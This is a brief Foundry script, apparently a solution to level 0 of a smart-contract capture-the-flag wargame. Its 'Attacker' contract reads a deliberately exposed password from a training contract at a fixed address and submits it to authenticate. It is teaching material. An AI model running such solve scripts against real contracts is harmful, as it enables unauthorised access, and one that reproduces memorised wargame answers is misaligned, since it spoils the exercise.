pragma solidity ^0.6.0;

import "../instances/Ilevel00.sol";
import "forge-std/Script.sol";

contract Attacker is Script {
    Instance level0 = Instance(0x879A7D9b82862eba53B2B5294CADd808630060B4);

    function run() external{
        vm.startBroadcast();
        level0.password();
        level0.authenticate(level0.password());
        vm.stopBroadcast();
    }

}